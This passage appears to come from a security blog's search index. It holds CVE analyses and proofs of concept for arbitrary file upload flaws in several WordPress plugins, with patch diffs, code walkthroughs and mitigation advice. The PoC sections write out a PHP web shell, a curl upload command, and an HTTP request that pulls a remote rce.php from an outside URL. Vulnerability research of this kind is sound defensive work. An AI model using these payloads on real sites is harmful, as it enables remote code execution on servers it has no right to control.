upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability occurs because the plugin skips MIME checking (test_type =\u003e false) during upload, allowing .php files to be uploaded. The file is deleted immediately after processing but exists briefly enough to be exploited via a race condition. ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rRoot cause: missing MIME checks + storing temporary files in a public directory. Patched in 1.5.15 (test_type =\u003e true). Mitigation: always validate MIME types, avoid storing executable files in public directories. ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rFile Upload via Race Condition Arbitrary File Upload WordPress Kadence WooCommerce Email Designer Plugin \u003c= 1.5.14 is vulnerable to Arbitrary File Upload ","date":"2025-11-08","objectID":"/posts/2025-11-08-cve-2025-39557/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-39557 Analysis \u0026 POC","uri":"/posts/2025-11-08-cve-2025-39557/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress TI WooCommerce Wishlist Plugin.","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe “Unrestricted Upload of File with Dangerous Type” vulnerability in TemplateInvaders TI WooCommerce Wishlist allows uploading a Web Shell to the web server. This issue affects TI WooCommerce Wishlist: from n/a to before 2.10.0. CVE ID: CVE-2025-47577 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 2.9.2 Patched Versions: 2.10.0 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress TI WooCommerce Wishlist Plugin ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - TI WooCommerce Wishlist: 2.9.2 (vulnerable) and 2.10.0 (patched). Diff tool - Meld or any diff tool to check and compare differences between versions. WooCommerce WC Fields Factory ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rfunction tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, 'test_type' =\u003e false, ] ); return $upload; } In the vulnerable version, the function tinvwl_upload_file_wc_fields_factory() calls wp_handle_upload() to upload files into WordPress’s official uploads directory (wp-content/uploads/\u003cyear\u003e/\u003cmonth\u003e/). Bug\rHowever, the option test_type =\u003e false causes WordPress to skip MIME Type checking against its allowed whitelist. This allows an attacker to upload dangerous files such as a .php web shell to the server. function tinvwl_upload_file_wc_fields_factory( $file ) { if ( ! function_exists( 'wp_handle_upload' ) ) { require_once( ABSPATH . 'wp-admin/includes/file.php' ); } $upload = wp_handle_upload( $file, [ 'test_form' =\u003e false, ] ); return $upload; } The patch removes the 'test_type' =\u003e false option, so by default 'test_type' =\u003e true is used, enabling MIME checks against the whitelist and preventing uploads of dangerous files like .php web shells. ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rQuestion\rBefore tracing further, I want to inspect wp_handle_upload() to answer two questions: Why does removing 'test_type' =\u003e false enable MIME whitelist checks? What does that whitelist include? wp_handle_upload() is a wrapper for _wp_handle_upload() function wp_handle_upload( \u0026$file, $overrides = false, $time = null ) { /* * $_POST['action'] must be set and its value must equal $overrides['action'] * or this: */ $action = 'wp_handle_upload'; if ( isset( $overrides['action'] ) ) { $action = $overrides['action']; } return _wp_handle_upload( $file, $overrides, $time, $action ); } wp_handle_upload() sets $action and calls _wp_handle_upload(). In the file containing _wp_handle_upload(), line 915 $test_type = isset( $overrides['test_type'] ) ? $overrides['test_type'] : true; 👉 This assigns the value to $test_type — if $overrides contains the 'test_type' key, its value is used; otherwise the default is true. So when we don’t pass test_type or pass test_type =\u003e true, $test_type is true. At lines 953-973 if ( $test_type ) { $wp_filetype = wp_check_filetype_and_ext( $file['tmp_name'], $file['name'], $mimes ); $ext = empty( $wp_filetype['ext'] ) ? '' : $wp_filetype['ext']; $type = empty( $wp_filetype['type'] ) ? '' : $wp_filetype['type']; $proper_filename = empty( $wp_filetype['proper_filename'] ) ? '' : $wp_filetype['proper_filename']; // Check to see if wp_check_filetype_and_ext() determined the filename was incorrect. if ( $proper_filename ) { $file['name'] = $proper_filename; } if ( ( ! $type || ! $ext ) \u0026\u0026 ! current_user_can( 'unfiltered_upload' ) ) { return call_user_func_array( $upload_error_handler, array( \u0026$file, __( 'Sorry, you are not allowed to upload this file type.' ) ) ); } if ( ! $type ) { $type = $file['type']; } } else { $type = ''; } If $test_type = true, the function calls wp_check_filetype_and_ext() to validate the file extension and MIME type based on WordPress’s allowed whitelist. If the file lacks an allowed extension or MIME type, and the user does not have the unfiltered_upload capability, the upload is rejected. Lines 3089-3315 function wp_check_filetype_and_ext( $file, $filename, $mimes = null ) { $proper_filename = false; // Do basic extension validation and MIME mapping. $wp_filetype = wp_check_filetype( $filename, $mimes ); ... // Validate image types. // Validate files that didn't get validated during previous checks. // The mime type must be allowed. ... } wp_check_filetype_and_ext() calls wp_check_filetype() to perform basic extension validation and MIME mapping. Line 3045-3062 function wp_check_filetype( $filename, $mimes = null ) { if ( empty( $mimes ) ) { $mimes = get_allowed_mime_types(); } $type = false; $ext = false; foreach ( $mimes as $ext_preg =\u003e $mime_match ) { $ext_preg = '!\\.(' . $ext_preg . ')$!i'; if ( preg_match( $ext_preg, $filename, $ext_matches ) ) { $type = $mime_match; $ext = $ext_matches[1]; break; } } return compact( 'ext', 'type' ); } wp_check_filetype() only checks the file extension against WordPress’s MIME whitelist — it does not verify the actual file content. The function calls get_allowed_mime_types() to retrieve the list of allowed MIME types. Line 3640-3661 function get_allowed_mime_types( $user = null ) { $t = wp_get_mime_types(); unset( $t['swf'], $t['exe'] ); if ( function_exists( 'current_user_can' ) ) { $unfiltered = $user ? user_can( $user, 'unfiltered_html' ) : current_user_can( 'unfiltered_html' ); } if ( empty( $unfiltered ) ) { unset( $t['htm|html'], $t['js'] ); } /** * Filters the list of allowed mime types and file extensions. * * @since 2.0.0 * * @param array $t Mime types keyed by the file extension regex corresponding to those types. * @param int|WP_User|null $user User ID, User object or null if not provided (indicates current user). */ return apply_filters( 'upload_mimes', $t, $user ); } wp_get_mime_types() returns the actual list of accepted MIME types. Line 3430-3557 function wp_get_mime_types() { /** * Filters the list of mime types a","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads → possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads → possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads → possible RCE\"]\rgraph TD\rA[\"HTTP POST (tinv_wishlist_id, product_id, form[...] + file)\"] --\u003e B[\"wp_loaded → add_to_wishlist()\"]\rB --\u003e C[\"apply_filters('tinvwl_addtowishlist_prepare_form', $_POST['form'], $_POST, $_FILES)\"]\rC --\u003e D[\"tinvwl_meta_wc_fields_factory($meta, $post, $files)\"]\rD --\u003e E[\"foreach $files as $name =\u003e $file\"]\rE --\u003e F[\"if array_key_exists($name, $meta)\"]\rF --\u003e G[\"tinvwl_upload_file_wc_fields_factory($file)\"]\rG --\u003e H[\"wp_handle_upload($file, ['test_form'=\u003efalse, 'test_type'=\u003efalse])\"]\rH --\u003e I[\"_wp_handle_upload() — MIME checks skipped\"]\rI --\u003e J[\"File written to /wp-content/uploads → possible RCE\"]\r","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rCreate a .php file containing a web shell: \u003c?php system($_REQUEST[\"cmd\"]) ?\u003e Send a POST request: curl -X POST \"http://localhost\" -F \"tinv_wishlist_id=1\" -F \"product_id=1\" -F \"form[image]=1\" -F \"image=@rce.php\" RCE via file upload RCE via file upload\r","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-47577 vulnerability originates from disabling MIME type checks (test_type =\u003e false) in the wp_handle_upload() call, allowing an attacker to upload arbitrary files, including malicious PHP code. Once a file is uploaded into /wp-content/uploads/, it may be directly accessible and used to execute remote code (RCE). The 2.10.0 patch restores MIME checking, ensuring only file types listed in WordPress’s whitelist are allowed for upload. ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rAlways enforce MIME type and file extension checks when handling uploads. Do not override WordPress’s default security mechanisms such as test_type. When analyzing vulnerabilities, comparing patch diffs quickly reveals the root cause. Plugin developers should regularly audit hooks and filters related to uploads to prevent RCE risks. ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress TI WooCommerce Wishlist Plugin \u003c= 2.9.2 is vulnerable to Arbitrary File Upload ","date":"2025-11-07","objectID":"/posts/2025-11-07-cve-2025-47577/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-47577 Analysis \u0026 POC","uri":"/posts/2025-11-07-cve-2025-47577/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Embed PDF for WPForms Plugin.","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Embed PDF for WPForms plugin for WordPress contains a vulnerability that allows arbitrary file uploads due to missing file type checks in the ajax_handler_download_pdf_media function in all versions up to and including 1.1.5. This allows an authenticated attacker with access level Subscriber or higher to upload arbitrary files to the affected site’s server, which may lead to remote code execution. CVE ID: CVE-2025-10647 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 1.1.5 Patched Versions: 1.1.6 CVSS severity: High (9.9) Required Privilege: Subscriber Product: WordPress Embed PDF for WPForms Plugin ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Embed PDF for WPForms: 1.1.5 (vulnerable) and 1.1.6 (patched). Diff tool - Meld or any diff tool to inspect and compare differences between versions. WPForms Plugin ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\r","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:3:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rpublic function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } In the vulnerable version, the ajax_handler_download_pdf_media() function downloads a PDF file from the provided URL into WordPress’s Media Library via AJAX but does not check the file type or user capabilities. Bug\rAn attacker could upload a .php file to achieve RCE public function ajax_handler_download_pdf_media() { check_ajax_referer( 'epdf_wf_download_pdf_media' ); if ( ! current_user_can( 'upload_files' ) ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } // Download the file. $tmp_file = download_url( $url ); if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( /* translators: 1. An error message. */ 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } // Move from a temp file to the uploads directory. $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); $wp_filesystem-\u003emove( $tmp_file, $path ); ... } The patch: Adds a user capability check: if ( ! current_user_can( 'upload_files' ) ) { ... } Only users with upload capability can invoke the handler. Restricts accepted uploaded file types: if ( ! wp_check_filetype( basename( $url ) )['type'] ) { wp_send_json_error( array( 'msg' =\u003e __( 'The download failed', 'embed-pdf-wpforms' ), ) ); } wp_check_filetype() (WP Core) returns two keys: array( 'ext' =\u003e string|false, 'type' =\u003e string|false ) If type is not found in wp_get_mime_types() it returns false. By default this accepts only non-executable file types (does not accept php). ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:3:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Code\rThe ajax_handler_download_pdf_media() function: Checks the CSRF nonce check_ajax_referer( 'epdf_wf_download_pdf_media' ); Searching for the epdf_wf_download_pdf_media key in the plugin source code directory Nonce is created with key `_ajax_nonce`\rThe nonce is created with key _ajax_nonce and stored in the epdf_wf_pdf_viewer_strings object — its value can be retrieved in the browser console by calling epdf_wf_pdf_viewer_strings.nonce Retrieve nonce from browser console\rThis nonce is generated after visiting the page created by WPForms using the PDF Viewer Create a form using WPForms with PDF Viewer\rThe form is embedded into a WordPress Post/Page. Validate incoming data if ( empty( $_POST['url'] ) ) { wp_send_json_error(); } If the request has no url, the function returns a JSON error and stops execution. Sanitize and obtain the URL $url = esc_url_raw( wp_unslash( $_POST['url'] ) ); wp_unslash() removes slashes added by WordPress when sending POST data. esc_url_raw() sanitizes the URL before using it to download the file. Download the file to the server (temporary) $tmp_file = download_url( $url ); download_url() downloads the file from the URL to a temporary file on the server. Returns the path to the temporary file on success, or a WP_Error on failure. if ( is_wp_error( $tmp_file ) ) { wp_send_json_error( array( 'msg' =\u003e sprintf( __( 'The download failed with error \"%s\"', 'embed-pdf-wpforms' ), $tmp_file-\u003eget_error_message() ), ) ); } If the download fails → return JSON error with the error message. Determine the upload directory and filename $upload_dir = wp_upload_dir(); $file_name = wp_unique_filename( $upload_dir['path'], basename( $url ) ); $path = $upload_dir['path'] . DIRECTORY_SEPARATOR . $file_name; wp_upload_dir() returns an array with upload directory info: path, URL, subdir, … wp_unique_filename() ensures the filename does not conflict with existing files. $path is the full path where the file will be saved. $upload_dir['path'] typically looks like wp-content/uploads/year/month Initialize the WordPress Filesystem global $wp_filesystem; if ( ! class_exists( 'WP_Filesystem' ) ) { require_once ABSPATH . '/wp-admin/includes/file.php'; } WP_Filesystem(); Move the temporary file to the uploads directory $wp_filesystem-\u003emove( $tmp_file, $path ); Moves the file from temp ($tmp_file) to uploads ($path). Uses $wp_filesystem-\u003emove() instead of rename() for compatibility with environments (Direct, FTP, …). The ajax_handler_download_pdf_media() function is registered as a callback for the action hook: add_action( 'wp_ajax_epdf_wf_download_pdf_media', array( $this, 'ajax_handler_download_pdf_media' ) ); This means: wp_ajax_ requests require the user to be logged in (at least a Subscriber) to be accepted. epdf_wf_download_pdf_media is the action passed as a parameter. When a logged-in user sends a request to the /wp-admin/admin-ajax.php endpoint with action=epdf_wf_download_pdf_media, ajax_handler_download_pdf_media() is called to handle the request. ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:3:2","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#vulnerable-code"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow\rgraph TD\rA[\"Subscriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"]\rgraph TD\rA[\"Subscriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"]\rgraph TD\rA[\"Subscriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"]\rgraph TD\rA[\"Subscriber POST -\u003e /wp-admin/admin-ajax.php?action=epdf_wf_download_pdf_media\u0026url=...\"] --\u003e B[\"ajax_handler_download_pdf_media()\"]\rB --\u003e C[\"check_ajax_referer('epdf_wf_download_pdf_media')\"]\rC --\u003e D[\"download_url($url) -\u003e $tmp_file (temporary file)\"]\rD --\u003e E{\"is_wp_error($tmp_file) ?\"}\rE -- \"yes\" --\u003e F[\"wp_send_json_error() -\u003e STOP\"]\rE -- \"no\" --\u003e K[\"Uploaded file accessible → potential RCE\"]\r","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:3:3","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:4:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC)\rVisit the page containing the form created by WPForms using the PDF Viewer Retrieve the nonce Create a .php file containing RCE code and host it on the internet \u003c?php system($_REQUEST[\"cmd\"]); ?\u003e Send a POST request with the url pointing to the hosted file POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Cookie: wordpress_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7C69db0f51f219492ec3f150bb86bc1364f7cd33442587ddf3f1bf334e4cdec409; wp-settings-time-2=1761725656; wp-settings-4=libraryContent%3Dbrowse%26uploader%3D1%26mfold%3Do; wp-settings-time-4=1761637043; wp-settings-2=editor%3Dtinymce%26libraryContent%3Dbrowse; wp-settings-time-3=1761711790; wp-settings-3=libraryContent%3Dbrowse; _lscache_vary=fff4fa950d2b9daa95c3289bb2a7040a; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=sub%7C1762165151%7C5VGNGPhUPc74oSqabIRMtpA8jrLrn2JYdg6Lc4fqU8I%7Ca7cb9996e74be71e18c68f339c0ad07a43687c7eb701f89fe90374cc2a783131; wp-settings-time-5=1761992371 ... _ajax_nonce=ea2ccf0ccd\u0026action=epdf_wf_download_pdf_media\u0026url=https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php Access the uploaded file and achieve RCE RCE via file upload\r","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:4:1","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe vulnerability allowing arbitrary file upload in ajax_handler_download_pdf_media() was caused by missing checks for user capabilities and file type when downloading files from a URL, enabling an attacker with a Subscriber account to upload executable files (e.g., .php) and cause RCE. The developer fixed the issue by adding current_user_can('upload_files') and validating MIME types with wp_check_filetype() in version 1.1.6. For affected sites, update to 1.1.6 immediately, inspect and remove suspicious files in the uploads directory, and review user permissions and logs for signs of exploitation. ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:5:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaway\rAlways check user capabilities (current_user_can) before performing uploads via AJAX. Always validate file type/MIME (wp_check_filetype / whitelist) before saving files. Quickly update plugins when patches are available; review uploaded files and logs after disclosure. Apply the principle of least privilege and monitor for anomalous activity in media/uploads. ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:6:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#key-takeaway"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rArbitrary File Upload WordPress Embed PDF for WPForms Plugin \u003c= 1.1.5 is vulnerable to Arbitrary File Upload ","date":"2025-11-06","objectID":"/posts/2025-11-06-cve-2025-10647/:7:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10647 Analysis \u0026 POC","uri":"/posts/2025-11-06-cve-2025-10647/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Podlove Podcast Publisher Plugin.","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info\rThe Podlove Podcast Publisher plugin for WordPress has a vulnerability allowing arbitrary file uploads due to missing file type checks in the 'move_as_original_file' function in all versions up to and including 4.2.6. This enables unauthenticated attackers to upload arbitrary files to the affected site’s server, which can lead to remote code execution. CVE ID: CVE-2025-10147 Vulnerability Type: Arbitrary File Upload Affected Versions: \u003c= 4.2.6 Patched Versions: 4.2.7 CVSS severity: High (10) Required Privilege: Unauthenticated Product: WordPress Podlove Podcast Publisher Plugin ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:1:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 POC","uri":"/posts/2025-11-05-cve-2025-10147/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - Podlove Podcast Publisher: 4.2.6 (vulnerable) and 4.2.7 (patched). Diff tool - Meld or any diff tool to inspect and compare the differences between the two versions. ","date":"2025-11-05","objectID":"/posts/2025-11-05-cve-2025-10147/:2:0","tags":["analyst","plugin","arbitrary file upload"],"title":"CVE-2025-10147 Analysis \u0026 